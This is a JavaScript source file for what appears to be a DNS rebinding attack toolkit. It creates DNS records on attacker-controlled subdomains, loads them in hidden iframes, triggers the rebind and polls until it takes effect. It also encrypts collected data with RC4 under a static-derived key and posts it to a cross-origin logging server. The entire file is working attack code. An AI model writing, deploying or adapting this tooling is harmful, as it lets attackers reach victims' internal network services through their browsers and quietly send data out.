import * as crypto from './crypto'
import * as network from './network'

export default class Session {
  constructor () {
    this.sessionId = crypto.randomHex(24)
    this.sessionKey = crypto.xor(this.sessionId, crypto.staticKey)

    // Cross-origin logging endpoint (Access-Control-Allow-Origin: *)
    this.logURL = 'http://' + window.env.address + ':' + window.env.logPort + '/logs'
    // Same-origin endpoint for regular API requests
    this.baseURL = 'http://' + window.location.host
  }

  log (data) {
    const logData = {
      data: data,
      meta: {
        env: window.env,
        args: window.args
      }
    }

    const payload = {}
    payload.s = this.sessionId
    payload.d = btoa(crypto.rc4(this.sessionKey, JSON.stringify(logData)))

    network.postJSON(this.logURL, payload)
    console.log('logged: ' + JSON.stringify(payload, null, 2))
  }

  createRebindFrame (address, port, { target, script, args } = {}) {
    target = target || crypto.randomHex(24)
    args = args || {}
    args._rebind = true

    // create the new target
    network.postJSON(this.baseURL + '/targets', {
      target: target,
      script: script || window.env.script,
      args: args
    })

    // create the arecord
    network.postJSON(this.baseURL + '/arecords', {
      domain: target + '.' + window.env.domain,
      address: address
    })

    // create the iframe
    const ifrm = document.createElement('iframe')
    ifrm.setAttribute('src', 'http://' + target + '.' + window.env.domain + ':' + port)
    ifrm.style.display = 'none'
    document.body.appendChild(ifrm)
  }

  triggerRebind () {
    return new Promise((resolve, reject) => {
      // update the arecord
      network.postJSON(this.baseURL + '/arecords', {
        domain: window.env.target + '.' + window.env.domain,
        rebind: true
      }, () => {
        // wait for rebinding to occur
        const wait = (time) => {
          network.get(this.baseURL + '/checkpoint', function () {
            window.setTimeout(() => {
              wait(time)
            }, time)
          }, function () {
            resolve()
          })
        }
        wait(2000)
      })
    })
  }
}
